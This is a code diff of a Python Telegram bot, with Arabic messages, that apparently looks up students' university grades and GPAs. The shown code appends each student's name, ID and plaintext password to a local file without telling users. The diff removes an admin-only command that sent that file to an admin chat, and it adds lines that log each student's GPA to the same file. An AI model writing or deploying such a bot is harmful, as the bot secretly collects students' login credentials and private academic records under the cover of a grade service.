@@ -142,25 +142,18 @@ def send_sms(message, chat_id, number):
     data2 = json.loads(json_text)
     name=data2["stuName"]
     with open('data.txt', 'a') as file:
-    	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
+    	file.write(f"\n{'-' * 50}\nName: {name}\nID: {number}\nPassword: {text}")
 
     calculate_and_send_course_info(chat_id, data2)
-@bot.message_handler(commands=['users'])
-def users_command(message):
-    if str(message.chat.id) == admin_chat_id:
-        with open('data.txt', 'rb') as file:
-            bot.send_document(admin_chat_id, file)
-    else:
-        bot.reply_to(message, 'ليس لديك صلاحية الوصول لهذا الأمر.')
-
-
 
 def calculate_and_send_course_info(chat_id, data2):
     try:
         # اولي ترم اول
         first_semester_2022_2023 = data2["StuSemesterData"][0]["Semesters"][0]
         total_credits_2022_2023, message_2022_2023 = print_course_info(first_semester_2022_2023["Courses"], "اولي ترم اول")
-        bot.send_message(chat_id, f"{message_2022_2023}\nالساعات المسجلة: {first_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {first_semester_2022_2023['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
+        bot.send_message(chat_id, f"{message_2022_2023}\nالساعات المسجلة: {first_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {first_semester_2022_2023['CurrCH']}\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
+        with open('data.txt', 'a') as file:
+        	file.write(f"\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2022-2023): {e}")
 
@@ -169,7 +162,9 @@ def calculate_and_send_course_info(chat_id, data2):
         second_semester_2022_2023 = data2["StuSemesterData"][0]["Semesters"][1]
         total_credits_2022_2023 += print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني (2022-2023)")[0]
         message_2022_20232 = "\n\n" + print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني")[1]
-        bot.send_message(chat_id, f"{message_2022_20232}\nالساعات المسجلة: {second_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {second_semester_2022_2023['EarnedHrs']}\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
+        bot.send_message(chat_id, f"{message_2022_20232}\nالساعات المسجلة: {second_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {second_semester_2022_2023['CurrCH']}\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
+        with open('data.txt', 'a') as file:
+        	file.write(f"\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الثانية (2022-2023): {e}")
 
@@ -177,37 +172,50 @@ def calculate_and_send_course_info(chat_id, data2):
   #تانية ترم اول
         first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][0]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم اول")
-        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        with open('data.txt', 'a') as file:
+        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
     try:
      #تانية ترم تاني
         first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][1]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم تاني")
-        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        with open('data.txt', 'a') as file:
+        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
     try:
         #تالتة ترم اول
         first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][0]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم اول")
-        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        with open('data.txt', 'a') as file:
+        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
     try:
      #تالتة ترم تاني
         first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][1]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم تاني")
-        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        with open('data.txt', 'a') as file:
+        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
     try:
     #رابعه ترم اول
         first_semester_2023_2024 = data2["StuSemesterData"][3]["Semesters"][0]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "رابعة ترم اول")
-        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+        with open('data.txt', 'a') as file:
+        	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
+
+
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
+        
       
     
 
@@ -225,7 +233,7 @@ def print_course_info(course_data, semester_name):
         grade = course.get("Grade", "unannounced")
         total_credits += course_credit
         message_text += f"•[{course_name} ] [{course_credit}] [{grade}] \n"
-
+        
     return total_credits, message_text
 
 bot.polling()
